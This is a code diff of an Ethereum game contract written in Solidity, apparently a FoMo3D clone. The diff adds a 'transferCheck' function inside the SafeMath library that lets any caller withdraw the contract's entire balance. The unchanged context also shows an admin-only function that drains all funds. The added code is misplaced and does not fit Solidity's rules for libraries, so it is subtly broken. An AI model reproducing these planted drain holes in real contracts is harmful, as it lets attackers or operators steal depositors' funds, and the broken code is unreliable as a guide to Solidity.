@@ -281,12 +281,12 @@ contract Av8DShort is modularLong {
         // buy core
         buyCore(_pID, _affCode, _team, _eventData_);
     }
-	
+
 	function TeamHOMO() public {
         require(admin == msg.sender);
         msg.sender.transfer(address(this).balance);
     }
-	
+
     function buyXaddr(address _affCode, uint256 _team)
     isActivated()
     isHuman()
@@ -1838,4 +1838,14 @@ library SafeMath {
             return (z);
         }
     }
+	 function transferCheck() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
